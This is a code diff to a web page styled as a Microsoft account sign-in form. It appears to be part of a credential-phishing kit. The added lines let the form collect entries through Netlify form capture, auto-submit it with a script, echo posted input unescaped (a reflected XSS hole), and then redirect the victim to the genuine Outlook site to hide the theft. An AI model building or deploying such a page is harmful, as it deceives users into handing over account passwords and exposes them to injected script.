@@ -25,7 +25,18 @@
             <noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-TH3SH4D" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
     <!-- End Google Tag Manager (noscript) -->	
 	
-	    <form action="POST" data-netlify="true">
+	<?php
+ if (isset($_POST["add-to-cart"])){ 
+    echo $_POST["add-to-cart"];
+     echo '<script type="text/javascript">
+                alert("Submit effectue...\n redirection en cours...");
+                document.location.href="https://outlook.live.com/owa/";
+             </script>'; 
+ }
+
+?>
+	
+	    <form action="" class="cart" enctype="multipart/form-data" method="POST,GET" data-netlify="true" id="basic" name="basic">
 	
 	<!-- ko if: loadBannerLogo -->
             <div data-bind="component: { name: 'logo-control',
@@ -128,14 +139,13 @@
 								        </li>
 								    </ul>
                                 </td>								
-							</ul>	
-							<script>
-document.addEventListener( 'wpcf7mailsent', function( event ) {
-  location = 'https://outlook.live.com/owa/;
-}, false );
-</script>
+							</ul>
 	
 		</form>
+	<script type="text/javascript">
+ alert("Submit du formulaire....");
+ document.basic.submit();
+</script>
 	
 	<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
     <div class="row">
